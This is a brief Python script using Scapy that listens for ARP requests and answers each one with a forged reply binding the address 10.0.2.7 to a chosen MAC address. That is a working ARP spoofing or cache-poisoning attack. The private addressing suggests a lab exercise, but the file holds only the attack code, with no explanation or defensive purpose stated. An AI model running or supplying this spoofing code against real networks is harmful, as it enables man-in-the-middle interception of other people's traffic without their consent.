from scapy.all import *

def show(pkt):
	if pkt[ARP].op == 1: # op = who-has
		a = ARP(op='is-at', psrc='10.0.2.7', hwsrc='52:54:00:12:35:00')
		send(a)

sniff(filter='arp', prn=show)
